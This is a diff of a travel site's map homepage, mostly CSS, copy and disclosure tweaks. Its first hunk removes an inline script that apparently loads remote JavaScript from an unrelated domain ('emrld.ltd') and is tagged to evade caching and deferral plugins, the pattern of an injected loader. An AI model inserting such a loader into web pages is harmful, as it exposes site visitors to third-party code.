@@ -6,14 +6,7 @@
   <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16.png" />
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png" />
 
-  <script nowprocket data-noptimize="1" data-cfasync="false" data-wpfc-render="false" seraph-accel-crit="1" data-no-defer="1">
-  (function () {
-      var script = document.createElement("script");
-      script.async = 1;
-      script.src = 'https://emrld.ltd/NTQ4MDY2.js?t=548066';
-      document.head.appendChild(script);
-  })();
-</script>
+  <script src="consent.js"></script>
 
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
@@ -90,7 +83,7 @@
   .brand small{display:block;font-family:-apple-system,sans-serif;font-weight:500;font-size:.62rem;letter-spacing:.18em;text-transform:uppercase;color:var(--muted)}
   nav.links a{
     margin-left:26px;font-weight:600;font-size:.82rem;text-transform:uppercase;letter-spacing:.08em;color:var(--muted);
-    padding-bottom:3px;border-bottom:2px solid transparent;transition:.2s;
+    padding-bottom:3px;border-bottom:2px solid transparent;transition:.2s;white-space:nowrap;
   }
   nav.links a:hover{color:var(--coral);border-color:var(--coral)}
   .menu-toggle{display:none}
@@ -205,16 +198,17 @@
   /* ================= EXPLORER THEME (overrides) ================= */
   header.nav{background:rgba(236,226,204,.93);border-bottom:1px solid var(--ink)}
   .brand .dot{display:none}
-  .brand small{font-family:'IBM Plex Mono',monospace;letter-spacing:.22em}
+  .brand small{font-family:'Work Sans',-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;font-weight:600;font-size:.82rem;letter-spacing:.08em}
   nav.links a:hover{color:var(--coral);border-color:var(--brass)}
 
-  .hero p.kicker{font-family:'IBM Plex Mono',monospace;color:var(--teal);letter-spacing:.24em}
+  .hero p.kicker{font-family:'Work Sans',-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;color:var(--teal);font-weight:600;font-size:.82rem;letter-spacing:.08em}
   .hero h1{font-family:'Fraunces',serif;font-weight:900;font-size:clamp(2.6rem,6.4vw,4.4rem);line-height:1}
+  .hero h1 em{font-family:'Amatic SC',cursive;font-style:normal}
 
   #map{border-radius:0;border:1px solid var(--ink);box-shadow:0 16px 40px rgba(43,36,23,.22)}
   .map-wrap::before,.map-wrap::after{content:"";position:absolute;width:26px;height:26px;z-index:6;pointer-events:none}
-  .map-wrap::before{left:30px;top:-8px;border-left:3px solid var(--brass);border-top:3px solid var(--brass)}
-  .map-wrap::after{right:30px;bottom:2px;border-right:3px solid var(--brass);border-bottom:3px solid var(--brass)}
+  .map-wrap::before{left:30px;top:8px;border-left:3px solid var(--brass);border-top:3px solid var(--brass)}
+  .map-wrap::after{right:30px;bottom:8px;border-right:3px solid var(--brass);border-bottom:3px solid var(--brass)}
   .map-legend{background:var(--card);border:1px solid var(--ink);border-radius:0;box-shadow:0 8px 20px rgba(43,36,23,.2)}
   .map-legend b{font-family:'IBM Plex Mono',monospace;font-size:.66rem;letter-spacing:.12em;text-transform:uppercase}
   .legend-toggle{background:var(--card);border:1px solid var(--ink);border-radius:0;color:var(--coral)}
@@ -235,7 +229,7 @@
   .about>*{position:relative;z-index:1}
   .about .photo-frame{background:#fffdf6;border:1px solid var(--line);padding:10px 10px 40px;transform:rotate(-2.4deg);box-shadow:0 12px 26px rgba(43,36,23,.28);position:relative}
   .about .photo-frame img{width:100%;aspect-ratio:1/1;object-fit:cover;border-radius:0;display:block;filter:sepia(.2) saturate(.95)}
-  .about .photo-frame::after{content:"Giza, Egypt";position:absolute;left:0;right:0;bottom:8px;text-align:center;font-family:'Amatic SC',cursive;font-size:1.4rem;color:var(--muted)}
+  .about .photo-frame::after{content:"📍 Giza, Egypt";position:absolute;left:0;right:0;bottom:8px;text-align:center;font-family:'Amatic SC',cursive;font-size:1.4rem;color:var(--muted)}
   .about .sig{font-family:'Amatic SC',cursive;color:var(--coral);font-size:1.9rem;font-style:normal}
   @media(max-width:880px){.about .photo-frame{padding:6px 6px 26px}.about .photo-frame::after{font-size:1rem;bottom:3px}}
 
@@ -270,7 +264,7 @@
   .social-proof b{color:var(--ink)}
 
   /* ---- full-design: waypoint featured cities on a dashed route ---- */
-  .stories{max-width:var(--maxw);margin:30px auto 36px;padding:0 22px;position:relative;display:flex;gap:26px;justify-content:center;flex-wrap:wrap}
+  .stories{max-width:var(--maxw);margin:30px auto 36px;padding:0 22px;position:relative;display:flex;gap:26px;justify-content:space-evenly;flex-wrap:wrap}
   .stories::before{content:"";position:absolute;left:8%;right:8%;top:44px;border-top:2px dashed rgba(168,72,42,.4);z-index:0}
   .story{position:relative;z-index:1;display:flex;flex-direction:column;align-items:center;gap:9px;cursor:pointer;transition:transform .2s;text-decoration:none}
   .story:hover{transform:translateY(-5px)}
@@ -328,18 +322,18 @@
 <div class="hero">
   <p class="kicker">A world worth exploring</p>
   <h1>Where will you <em>roam</em> next?</h1>
-  <p class="sub">Scan the globe to discover the world's most traveled cities & destinations. Click on a location bubble to learn more</p>
   <div class="social-proof">
     <div class="avatars">
       <span style="background:#a8482a">J</span><span style="background:#3f5138">M</span><span style="background:#b0802f">A</span><span style="background:#8a3a20">S</span><span style="background:#6f7d4a">K</span>
     </div>
-    <p><b id="sp-cities">248 cities</b> &middot; <b>60+ countries</b> &middot; guides written from real trips</p>
+    <p><b id="sp-cities">248 cities</b> &middot; <b>60+ countries</b> &middot; guides with insight from real travelers</p>
   </div>
 </div>
 
 <!-- ===== Waypoint featured cities ===== -->
 <div class="stories" id="featured-cities" aria-label="Featured cities"></div>
 
+<p class="sub" style="max-width:620px;margin:0 auto 14px;text-align:center;color:var(--muted);font-size:1.05rem">Scan the globe to discover the world's most traveled cities & destinations. Click on a location bubble to learn more</p>
 <div class="map-wrap">
   <div id="map"></div>
   <div class="map-legend">
@@ -353,7 +347,7 @@
   </div>
   <button id="legend-toggle" class="legend-toggle" aria-label="Show the map key">⊕ Key</button>
 </div>
-<p class="map-note" id="map-note">Drag to pan · scroll to zoom · hover a bubble for city stats · click a city to open its page. Figures are approximate starter data (Euromonitor / Mastercard rankings) and will be refined.</p>
+<p class="map-note" id="map-note">Drag to pan · scroll to zoom · hover a bubble for city stats · click a city to open its page.<br><em>Figures are estimates.</em></p>
 
 <!-- ===== Email signup ===== -->
 <section class="block">
@@ -403,6 +397,7 @@
     <a href="privacy.html">Privacy Policy</a>
     <a href="terms.html">Terms of Service</a>
   </div>
+  <small class="foot-disclosure" style="display:block;width:100%;color:#d8d0b8">Some links on this site are affiliate links: if you book through them we may earn a small commission at NO EXTRA COST TO YOU.<br>Using our links helps keep the site up to date. <b><em>THANK YOU FOR YOUR CONTRIBUTION.</em></b> Details in our <a href="privacy.html" style="text-decoration:underline;color:#d8d0b8">Privacy Policy</a>.</small>
 </footer>
 
 <script>
@@ -673,7 +668,7 @@ const CITIES = [
   var FEATURED = [
     { label:"New article",            city:"Kyoto",     cls:"fx-new" },
     { label:"Top visited",            city:"Hong Kong", cls:"fx-top" },
-    { label:"Underrated destination", city:"Lisbon",    cls:"fx-under" },
+    { label:"Underrated pick", city:"Lisbon",    cls:"fx-under" },
     { label:"Seasonal pick",          city:"Marrakech", cls:"fx-season" }
   ];
   function ph(name){
@@ -789,7 +784,7 @@ map.on("load", () => {
   // Update hint text for mobile users
   if(isTouch){
     document.getElementById("legend-hint").textContent = "Tap a bubble for details";
-    document.getElementById("map-note").textContent = "Pinch to zoom · drag to pan · tap a city bubble to open its card. Figures are approximate starter data (Euromonitor / Mastercard rankings) and will be refined.";
+    document.getElementById("map-note").innerHTML = "Pinch to zoom &middot; drag to pan &middot; tap a city bubble to open its card.<br><em>Figures are estimates.</em>";
   }
 
   function popupHTML(p, withButton){
